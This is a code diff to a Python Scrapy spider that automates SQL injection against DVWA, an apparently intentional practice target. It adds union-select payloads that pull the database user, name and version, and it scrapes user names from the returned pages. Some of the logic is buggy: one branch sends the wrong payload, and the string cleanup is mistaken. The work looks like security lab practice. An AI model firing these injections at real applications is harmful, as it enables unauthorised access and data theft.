@@ -1,7 +1,9 @@
 import scrapy as scrapy
-
+from bs4 import BeautifulSoup
 from dvwacrawler.constants import *
 from scrapy import Spider
+
+from dvwacrawler.items import DvwacrawlerItem
 
 
 class DVWASpider(Spider):
@@ -64,12 +66,45 @@ class DVWASpider(Spider):
                                   cookies={DVWA_SECURITY_KEY: DVWA_SECURITY_VALUE})
 
     def payloads(self, response, type=None):
-        payloads = []
+        payloads = ["%' or 0=0 union select null, user() #",
+                    "%' or 0=0 union select null, database() #",
+                    "%' or 0=0 union select null, version() #"]
 
-        if type == "users":
-            pass
+        if not type:
+            yield scrapy.FormRequest.from_response(
+                response,
+                formdata={'id': payloads[0]},
+                callback=self.parse_users
+            )
+            # return scrapy.Request.
         elif type == "version":
+            yield scrapy.FormRequest.from_response(
+                response,
+                formdata={'id': payloads[0]},
+                callback=self.parse_version
+            )
+        elif type == "database":
             pass
 
     def parse_users(self, response):
+        results = response.body
+        soup = BeautifulSoup(results)
+        for tag in soup.findAll('pre'):
+            _, firstname_field, surname_field = tag.prettify().split('<br/>')
+            firstname = firstname_field.replace('First name: ', '')
+            surname = surname_field.replace('Surname: ', ''.replace('</pre>', '').strip())
+            item = DvwacrawlerItem()
+            item['firstname'] = firstname
+            item['surname'] = surname
+            yield item
+
+        launch_payload = scrapy.Request(url=DVWA_BASE_URL + DVWA_VULNERABILITY_POINT,
+                                        callback=self.payloads)
+        launch_payload.cb_kwargs['type'] = "version"
+        return launch_payload
+
+    def parse_version(self, response):
+        pass
+
+    def parse_database(self, response):
         pass
